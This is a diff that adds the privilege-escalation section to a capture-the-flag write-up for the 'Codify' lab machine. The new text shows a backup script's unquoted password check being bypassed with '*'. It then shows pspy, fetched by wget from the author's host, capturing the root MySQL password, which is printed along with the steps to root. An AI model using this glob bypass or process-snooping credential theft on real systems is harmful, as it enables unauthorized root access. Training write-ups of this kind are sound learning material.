@@ -304,7 +304,7 @@ done
 
 There are two potential vulnerabilities in the script due to poor programming practices.
 
-1.- The first error occurs when comparing two values without using quotes, as this can cause some bash characters to be misinterpreted and we can bypass authentication by entering a * as the password::
+1.- The first error occurs when comparing two values without using quotes, as this can cause some bash characters to be misinterpreted and we can bypass authentication by entering a * as the password:
 
 <br />
 
@@ -312,10 +312,111 @@ There are two potential vulnerabilities in the script due to poor programming pr
 
 <br />
 
-2.- And the second has to do with what is executing the script, since as we can see every time we execute it, the password that is in the /root/.creds file is being leaked, so if we listen with a program like pspy, we can surely capture it.
+2.- And the second has to do with what is executing the script, since as we can see every time we execute it the password that is in the /root/.creds file is being leaked, so if we listen with a program like pspy, we can surely capture it.
 
 <br />
 
 ![10](../../../assets/images/Codify/10.png)
+
+<br />
+
+## Password Bypass:
+
+<br />
+
+When we run the script it asks us for a password:
+
+<br />
+
+```bash
+joshua@codify:/opt/scripts$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root:
+```
+
+<br />
+
+And if we enter an incorrect password it does not let us run the program:
+
+<br />
+
+```bash
+joshua@codify:/opt/scripts$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root: 
+Password confirmation failed!
+```
+
+<br />
+
+However, as we have seen before, quotation marks are not used for comparison, so if we enter a *, the program misinterprets our input and considers the password correct, allowing us to run it without any problem:
+
+<br />
+
+```bash
+joshua@codify:/opt/scripts$ sudo /opt/scripts/mysql-backup.sh
+Enter MySQL password for root: 
+Password confirmed!
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Backing up database: mysql
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+Backing up database: sys
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+All databases backed up successfully!
+Changing the permissions
+Done!
+```
+
+<br />
+
+Now that we can run the entire program, we download [pspy](https://github.com/DominicBreuker/pspy?tab=readme-ov-file) and transfer it to the victim machine:
+
+<br />
+
+```bash
+joshua@codify:/tmp/Privesc$ wget http://10.10.14.13/pspy64
+--2025-01-02 12:27:09--  http://10.10.14.13/pspy64
+Connecting to 10.10.14.13:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64                                        100%[=================================================================================================>]   2.96M  2.66MB/s    in 1.1s    
+
+2025-01-02 12:27:10 (2.66 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+joshua@codify:/tmp/Privesc$ ls -l pspy64 
+-rw-rw-r-- 1 joshua joshua 3104768 Jan  2  2025 pspy64
+```
+
+<br />
+
+Once transferred, we run pspy in one window and in the other we run the script capturing the credentials in this way:
+
+<br />
+
+```bash
+2025/01/02 12:29:29 CMD: UID=0     PID=2610   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;
+```
+
+<br />
+
+We tried to root it with the new password and.... Come on! We have the root.txt flag!
+
+<br />
+
+```bash
+joshua@codify:/tmp/Privesc$ su root
+Password: 
+root@codify:/tmp/Privesc# cd /root
+root@codify:~# cat root.txt 
+e2b32c3ca09277a65e1310b510xxxxxx
+```
+
+<br />
+
+I hope you enjoyed the machine and clarified your doubts. Keep hacking!❤️❤️
 
 <br />
